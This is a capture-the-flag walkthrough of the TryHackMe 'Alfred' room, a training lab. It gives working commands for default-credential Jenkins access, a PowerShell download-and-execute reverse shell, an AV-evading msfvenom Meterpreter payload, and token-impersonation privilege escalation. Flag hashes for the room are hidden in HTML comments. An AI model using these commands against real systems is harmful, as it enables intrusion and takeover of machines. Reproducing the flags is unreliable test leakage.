# <div align='center'>[Alfred](https://tryhackme.com/room/alfred)</div>
<div align='center'>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.</div>
<div align='center'>
  <img src='https://github.com/user-attachments/assets/335a1059-b792-4edc-a5e2-ea767b35e798' height='200'></img>
</div>

### Step 1: Reconnaissance

```bash
:~$ nmap -sV 10.10.219.84
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 20:35 IST
Nmap scan report for 10.10.219.84
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The Nmap scan reveals three open ports:

* **Port 80** – HTTP service (Microsoft IIS 7.5)
* **Port 3389** – RDP (likely not useful at this point)
* **Port 8080** – Running Jetty server (possibly hosting Jenkins)

#### Exploring Port 80

Since port 80 is usually the default web service, let's visit it in the browser:

![image](https://github.com/user-attachments/assets/7483aad4-dbc8-4c4c-b387-ae7b2848ea25)

Unfortunately, there's nothing useful here.

#### Checking Out Port 8080 (Jenkins)

Given that the Jetty server is running on port 8080 and the version looks outdated, let’s take a look.

![image](https://github.com/user-attachments/assets/84cdf8d0-1e7e-4d29-9853-e5010f586658)

Let's try the classic move: default credentials `admin:admin`.

![image](https://github.com/user-attachments/assets/a53f02a6-4d96-4c6f-94ca-ea4b7376ead0)

**Bingo!** We're in 😎 — call me a genius!

### Step 2: Exploitation

While scrolling through the Jenkins interface, I finally found something promising under **Manage Jenkins** → **Script Console**.

![image](https://github.com/user-attachments/assets/4a883914-a503-4df8-b551-98415f9cc72b)

After experimenting for a bit, I figured out how to run commands. Let’s test it by listing the contents of the `C:` drive using:

```groovy
cmd = "cmd.exe /c dir"
println cmd.execute().text
```

![image](https://github.com/user-attachments/assets/08208f34-aedc-4bf8-b079-79792292dfb5)

Nice! We got some output. Now let’s move on to getting a reverse shell.

### Preparing the Reverse Shell

We'll use **Nishang**, a collection of PowerShell scripts for exploitation. Clone the repo:

```bash
git clone https://github.com/samratashok/nishang
```

Navigate to the `Shells` directory:

```bash
cd nishang/Shells/
```

Now, we’ll host the reverse shell script using a simple Python HTTP server:

```bash
python3 -m http.server
```

![image](https://github.com/user-attachments/assets/ec758bd2-d1b0-4211-8d65-cf8fcf5eafc7)

Meanwhile, set up a Netcat listener on a different port to catch the shell:

```bash
nc -lnvp 1234
```

### Executing the Reverse Shell

We’ll download and execute the reverse shell script on the target machine via the Jenkins Script Console:

```groovy
cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port"
println cmd.execute()
```

Example with my setup:

```groovy
cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.14.127:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.14.127 -Port 1234"
println cmd.execute()
```

And... **boom!** Got the reverse shell back:

![image](https://github.com/user-attachments/assets/9e6bc915-db95-4347-bcd8-d57eeb0c8c3e)

### Step 3: Post Exploitation

#### User Flag.txt

We begin by retrieving the `user.txt` file from the compromised system:

```powershell
cat 'C:\Users\bruce\Desktop\user.txt'
```

<!-- 79007a09481963edf2e1321abd9ae2a0 -->

![image](https://github.com/user-attachments/assets/d78864b1-d5c9-46fc-a42c-bec8cfbff9f8)


### Step 4: Privilege Escalation

#### Switching to Meterpreter

To make privilege escalation easier and more efficient, let’s upgrade to a **Meterpreter shell** using a custom payload.

Generate the payload with `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<your-ip> LPORT=<your-port> -f exe -o shell-test.exe
```

This payload uses the `x86/shikata_ga_nai` encoder to help evade antivirus detection.

#### Setting Up the Handler

Start **Metasploit Framework Console**:

```bash
msfconsole -q
```

Configure the handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-thm-ip>
set LPORT 5555
run
```

#### Delivering the Payload

Now, we need to transfer the `shell-test.exe` file to the target. From the directory where your payload is saved (e.g., `/home/user`), run a simple Python server:

```bash
python3 -m http.server
```

On the target (via the reverse shell), download the file:

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile('http://<your-thm-ip>:8000/shell-test.exe','shell-test.exe')"
```

![image](https://github.com/user-attachments/assets/4408c39f-2e4b-4662-abd9-33f0291d7937)

Execute the payload:

```powershell
Start-Process "shell-test.exe"
```

![image](https://github.com/user-attachments/assets/ec6fbbcd-504b-4557-86e0-e49ed71d4b73)

Once the Meterpreter shell is received, type:

```bash
shell
```

![image](https://github.com/user-attachments/assets/f52a258f-15aa-4005-b744-567a4465c22a)

#### Privilege Escalation via Token Impersonation

Check current privileges:

```powershell
whoami /priv
```

![image](https://github.com/user-attachments/assets/c873e060-900e-4642-b150-32b0005d4af6)

We see `SeDebugPrivilege` and `SeImpersonatePrivilege` are enabled — perfect for token impersonation.

Load the **incognito** module in Meterpreter:

```bash
load incognito
```

> If `load incognito` fails, try `use incognito` or ensure your Metasploit is updated.

Press `Ctrl+C` to exit the shell and return to the Meterpreter prompt.

List available tokens:

```bash
list_tokens -g
```

![image](https://github.com/user-attachments/assets/580e84f2-ddf3-4c5c-a265-50404dd99b3e)

We can see that the `BUILTIN\Administrators` token is available.

Impersonate it:

```bash
impersonate_token "BUILTIN\\Administrators"
```

![image](https://github.com/user-attachments/assets/15dfdeb9-451f-4199-84b2-ab173774e818)

### Final Step: Root Flag

Before reading the root flag, let’s migrate to a stable system process for persistence. View running processes:

![image](https://github.com/user-attachments/assets/0ee6b838-9ec2-434e-aa7a-81c4f56eeb4b)

Choose a stable process and migrate to it:

```bash
migrate <PID>
```

![image](https://github.com/user-attachments/assets/c1b0fc0a-a1f4-4769-8e52-1bf3016fda1f)

#### Root Flag.txt

Once you have SYSTEM privileges, retrieve the root flag:

```powershell
type 'C:\Windows\System32\config\root.txt'
```

![image](https://github.com/user-attachments/assets/609af3d5-7e0b-43b4-a689-640cbde2695e)

<!-- dff0f748678f280250f25a45b8046b4a -->

